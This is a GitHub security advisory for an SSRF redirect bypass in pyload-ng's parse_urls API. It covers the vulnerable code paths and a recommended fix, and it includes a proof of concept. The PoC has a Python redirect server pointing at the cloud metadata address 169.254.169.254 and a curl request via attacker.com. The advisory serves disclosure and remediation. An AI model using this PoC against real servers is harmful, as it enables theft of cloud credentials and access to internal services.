# [M] pyload-ng: SSRF via HTTP Redirect Bypass in parse_urls API

## Summary
Severity: Medium
Advisory: GHSA-8rp3-xc6w-5qp5
CVE: CVE-2026-46561
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-8rp3-xc6w-5qp5
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev100

## Details
## Summary

The SSRF mitigation added in commit `33c55da` for GHSA-7gvf-3w72-p2pg is incomplete. The `PREREQFUNCTION`-based private IP check was correctly applied to `HTTPChunk` (download path) but not to `HTTPRequest` (used by the `parse_urls` API). An authenticated attacker can supply a URL pointing to an attacker-controlled server that responds with a 302 redirect to an internal/private IP address, bypassing the `is_global_host()` check on the initial URL.

## Details

The `parse_urls` API method validates the initial URL hostname:

```python
# src/pyload/core/api/__init__.py:600-604
if url:
    urlp = urlparse(url)
    hostname = urlp.hostname
    if urlp.scheme in ("http", "https") and hostname and is_global_host(hostname):
        page = get_url(url)
```

`get_url()` is imported from `request_factory.py` and creates an `HTTPRequest` with default settings:

```python
# src/pyload/core/network/request_factory.py:58-64
def get_url(self, *args, **kwargs):
    with HTTPRequest(None, self.get_options()) as h:
        rep = h.load(*args, **kwargs)
    return rep
```

`HTTPRequest.__init__` sets `allow_private_ip = True` by default:

```python
# src/pyload/core/network/http/http_request.py:75
self.allow_private_ip = True
```

The `init_handle()` method enables redirect following:

```python
# src/pyload/core/network/http/http_request.py:117-118
self.c.setopt(pycurl.FOLLOWLOCATION, 1)
self.c.setopt(pycurl.MAXREDIRS, 10)
```

The `_pre_request_callback` that should block redirects to private IPs is a no-op when `allow_private_ip` is `True`:

```python
# src/pyload/core/network/http/http_request.py:574-582
def _pre_request_callback(self, conn_primary_ip, conn_local_ip, conn_primary_port, conn_local_port):
    if not self.allow_private_ip and not is_global_address(conn_primary_ip):
        return pycurl.PREREQFUNC_ABORT
    return pycurl.PREREQFUNC_OK
```

The fix at commit `33c55da` correctly set `allow_private_ip = False` in `HTTPChunk` (http_chunk.py:136) for the download path, but `HTTPRequest` used by `RequestFactory.get_url()` retains the default of `True`, leaving the `parse_urls` API unprotected against redirect-based SSRF.

## PoC

```bash
# Step 1: Start a redirect server on attacker-controlled host
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('0.0.0.0', 8888), H).serve_forever()
"

# Step 2: Authenticated user with ADD permission calls parse_urls
curl -X POST 'http://pyload-host:8000/api/parse_urls' \
  -H 'Cookie: session=<valid_session>' \
  -d 'url=http://attacker.com:8888/redirect'

# Expected flow:
# 1. is_global_host('attacker.com') -> True (passes validation)
# 2. get_url() creates HTTPRequest with allow_private_ip=True
# 3. pycurl fetches attacker.com:8888, receives 302 -> http://169.254.169.254/latest/meta-data/
# 4. _pre_request_callback runs but skips check (allow_private_ip=True)
# 5. pycurl follows redirect to cloud metadata endpoint
# 6. Response body parsed by RE_URLMATCH, any URLs in metadata returned to attacker
```

## Impact

An authenticated attacker with ADD permission can perform SSRF against:

- **Cloud metadata endpoints** (AWS IMDSv1 at `169.254.169.254`, GCP, Azure) — potentially leaking IAM credentials, instance metadata, and secrets
- **Internal services** on private networks (e.g., `10.x.x.x`, `172.16.x.x`, `192.168.x.x`)
- **Localhost services** (`127.0.0.1`) running on the pyload server

Data exfiltration is partially limited by the `RE_URLMATCH` regex filter (only URL-like strings from the response body are returned), but cloud metadata responses often contain URLs or URL-like paths that match this pattern. The `REDIR_PROTOCOLS` setting limits redirects to HTTP/HTTPS only.

## Recommended Fix

Set `allow_private_ip = False` in `RequestFactory.get_url()`:

```python
# src/pyload/core/network/request_factory.py
def get_url(self, *args, **kwargs):
    with HTTPRequest(None, self.get_options()) as h:
        h.allow_private_ip = False  # Prevent SSRF via redirects
        rep = h.load(*args, **kwargs)
    return rep
```

Alternatively, change the default in `HTTPRequest.__init__` to `False`:

```python
# src/pyload/core/network/http/http_request.py:75
self.allow_private_ip = False
```

The second approach is more defensive (secure by default), but may require auditing other callers that legitimately need to access private IPs. The first approach is the targeted fix.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5
- https://nvd.nist.gov/vuln/detail/CVE-2026-46561
- https://github.com/pyload/pyload
